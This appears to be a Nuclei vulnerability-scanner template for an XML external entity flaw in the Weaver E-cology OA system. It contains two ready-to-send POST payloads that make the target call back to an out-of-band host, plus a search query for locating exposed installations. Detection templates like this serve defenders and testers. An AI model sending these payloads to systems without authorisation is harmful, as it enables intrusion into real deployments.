http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  raw:
  - 'POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/xml


    <?xml version="1.0" encoding="utf-8"?>

    <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">

    <M><syscode>&send;</syscode></M>

    '
  - 'POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/xml


    <?xml version="1.0" encoding="utf-8"?>

    <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">

    <M><syscode>&send;</syscode></M>

    '
  stop-at-first-match: true
id: ecology-deleteuserrequestinfobyxml-xxe
info:
  author: Co5mos
  description: The initial filtering of user input for a certain feature in the Weaver
    E-cology system was not very robust, which resulted in the possibility of triggering
    XXE when processing user input.
  metadata:
    hunter-query: "product.name=\"\u6CDB\u5FAE e-cology 9.0 OA\""
    max-request: 2
    verified: true
  name: E-cology deleteUserRequestInfoByXml - XML Entity Injection
  reference:
  - https://blog.csdn.net/qq_41904294/article/details/131878446
  severity: critical
  tags: weaver,e-cology,xxe
